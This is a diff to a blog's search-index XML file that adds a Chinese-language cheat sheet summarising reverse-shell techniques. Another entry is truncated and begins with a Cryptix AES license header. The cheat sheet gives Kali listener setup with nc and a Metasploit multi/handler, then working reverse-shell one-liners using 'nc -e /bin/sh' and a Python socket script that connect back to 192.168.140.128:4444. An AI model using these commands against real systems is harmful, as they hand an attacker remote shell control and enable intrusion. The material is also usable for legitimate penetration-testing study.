@@ -1,6 +1,24 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>反弹shell姿势总结</title>
+    <url>/2019/11/27/bulldog/</url>
+    <content><![CDATA[<h1 id="反弹shell姿势总结"><a href="#反弹shell姿势总结" class="headerlink" title="反弹shell姿势总结"></a>反弹shell姿势总结</h1><h2 id="在Kali上开启监听"><a href="#在Kali上开启监听" class="headerlink" title="在Kali上开启监听"></a>在<code>Kali</code>上开启监听</h2><h3 id="使用-nc"><a href="#使用-nc" class="headerlink" title="使用 nc"></a>使用 <code>nc</code></h3><pre><code>nc -lvp 4444</code></pre><p><img src="/images/reverseShell/nc.png" alt="ncshell"></p>
+<h3 id="使用msf"><a href="#使用msf" class="headerlink" title="使用msf"></a>使用<code>msf</code></h3><pre><code>注意系统不同所使用的`payload`也不同,可根据`uname -a`查看系统内核信息
+    msfconsole
+    use exploits/multi/handler
+    set payload linux/x64/shell/reverse_tcp
+    set lhost yourhost
+    set lport yourport
+    exploit</code></pre><p><img src="/images/reverseShell/msf2.png" alt="msf1"></p>
+<h3 id="使用python"><a href="#使用python" class="headerlink" title="使用python"></a>使用<code>python</code></h3><h2 id="发送shell"><a href="#发送shell" class="headerlink" title="发送shell"></a>发送<code>shell</code></h2><h3 id="使用nc"><a href="#使用nc" class="headerlink" title="使用nc"></a>使用<code>nc</code></h3><pre><code>nc 192.168.140.128 4444 -e /bin/sh</code></pre><p><img src="/images/reverseShell/nc2.png" alt="nc2"><br><img src="/images/reverseShell/nc3.png" alt="nc3"></p>
+<h3 id="使用python-1"><a href="#使用python-1" class="headerlink" title="使用python"></a>使用<code>python</code></h3><pre><code>python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.140.128&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</code></pre><p> <img src="/images/reverseShell/py.png" alt="py"><br> <img src="/images/reverseShell/py2.png" alt="py2"></p>
+]]></content>
+      <tags>
+        <tag>shell</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>first</title>
     <url>/2019/11/27/first/</url>
     <content><![CDATA[<h2 id="Cryptix-AES-v3-2-0"><a href="#Cryptix-AES-v3-2-0" class="headerlink" title="Cryptix AES v3.2.0"></a>Cryptix AES v3.2.0</h2><h3 id="Cryptix-General-License"><a href="#Cryptix-General-License" class="headerlink" title="Cryptix General License"></a>Cryptix General License</h3><pre>
